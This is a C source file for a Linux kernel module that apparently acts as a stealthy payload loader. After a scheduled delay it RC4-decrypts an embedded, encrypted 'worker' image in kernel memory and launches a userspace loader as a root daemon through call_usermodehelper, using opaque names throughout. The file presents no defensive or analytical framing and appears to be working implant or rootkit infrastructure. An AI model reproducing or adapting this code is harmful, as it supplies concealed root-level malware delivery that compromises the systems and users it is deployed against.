#include <em_ksnftc.h>

#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/vmalloc.h>
#include <linux/workqueue.h>

extern const unsigned char em_ksnftc_worker[1];
extern const unsigned int em_ksnftc_worker_len;
extern const unsigned char em_ksnftc_worker_key[1];
extern const unsigned int em_ksnftc_worker_key_len;

#define LOADER_PATH "/usr/libexec/ks-worker-loader"
static void em_ksnftc_umh_run(struct work_struct *work);
static DECLARE_DELAYED_WORK(em_ksnftc_umh_work, em_ksnftc_umh_run);

char *em_ksnftc_img_data;
unsigned int em_ksnftc_img_len;

static void rc4(const unsigned char *key, size_t key_len,
				const unsigned char *in, size_t len, unsigned char *out)
{
	unsigned char state[256], swap;
	unsigned int i = 0, j = 0, k;

	for (k = 0; k < 256; k++)
		state[k] = (unsigned char)k;
	for (k = 0; k < 256; k++)
	{
		j = (j + state[k] + key[k % key_len]) & 255;
		swap = state[k];
		state[k] = state[j];
		state[j] = swap;
	}
	i = 0;
	j = 0;
	for (k = 0; k < len; k++)
	{
		i = (i + 1) & 255;
		j = (j + state[i]) & 255;
		swap = state[i];
		state[i] = state[j];
		state[j] = swap;
		out[k] = in[k] ^ state[(state[i] + state[j]) & 255];
	}
}

static void em_ksnftc_umh_run(struct work_struct *work)
{
	unsigned char *plain;
	/* static: UMH_NO_WAIT executes argv/envp after this function
	 * returns, so stack arrays would be use-after-free. */
	static char *argv[] = {(char *)LOADER_PATH, NULL};
	static char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
	int error;

	plain = vmalloc(em_ksnftc_worker_len);
	if (!plain)
		return;
	rc4(em_ksnftc_worker_key, em_ksnftc_worker_key_len,
		em_ksnftc_worker, em_ksnftc_worker_len, plain);
	em_ksnftc_img_data = (char *)plain;
	em_ksnftc_img_len = em_ksnftc_worker_len;
	atomic64_set(&em_ksnftc_umh_state, 1);
	/* UMH_NO_WAIT: the worker is a daemon, waiting for it would block
	 * this worker forever and make the module ununloadable. */
	error = call_usermodehelper(LOADER_PATH, argv, envp, UMH_NO_WAIT);
	if (!error)
	{
		atomic64_set(&em_ksnftc_umh_state, 2);
	}
	else
	{
		em_ksnftc_img_free();
		pr_debug("em_ksnftc: loader spawn failed: %d\n", error);
	}
}

int em_ksnftc_umh_schedule(unsigned int delay_sec)
{
	if (!delay_sec)
		return 0;
	schedule_delayed_work(&em_ksnftc_umh_work,
						  (unsigned long)delay_sec * HZ);
	return 0;
}

void em_ksnftc_umh_cancel(void)
{
	cancel_delayed_work_sync(&em_ksnftc_umh_work);
}

void em_ksnftc_img_free(void)
{
	vfree(em_ksnftc_img_data);
	em_ksnftc_img_data = NULL;
	em_ksnftc_img_len = 0;
}
